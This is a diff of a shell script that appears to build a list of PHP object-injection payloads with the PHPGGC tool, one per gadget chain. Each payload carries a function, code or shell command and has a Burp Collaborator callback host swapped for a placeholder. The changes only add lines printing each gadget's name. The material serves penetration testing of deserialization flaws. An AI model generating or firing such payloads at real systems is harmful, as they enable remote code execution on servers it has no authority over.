@@ -9,15 +9,19 @@ while read line;  do
    gadget=$(echo $line | cut -d' ' -f2) &&
    if echo $line | grep -q "<function> <parameter>"; then
       echo -e "\n"
+      echo $gadget
       ~/phpggc/phpggc $options $gadget "$function" "$command" | sed 's/poi-slinger.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.burpcollaborator.net/CHANGEME/g' | jq -aR .
    elif echo $line | grep -q "<code>"; then
       echo -e "\n"
+      echo $gadget
       ~/phpggc/phpggc $options $gadget "$function('$command');" | sed 's/poi-slinger.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.burpcollaborator.net/CHANGEME/g' | jq -aR .
    elif echo $line | grep -q "<command>"; then
       echo -e "\n"
+      echo $gadget
       ~/phpggc/phpggc $options $gadget "$command?$(date +%s)" | sed 's/poi-slinger.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.burpcollaborator.net/CHANGEME/g' | jq -aR .
    else
       echo -e "\n"
+      echo $gadget
       ~/phpggc/phpggc $options $gadget | sed 's/poi-slinger.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.burpcollaborator.net/CHANGEME/g' | jq -aR .
    fi;
 done
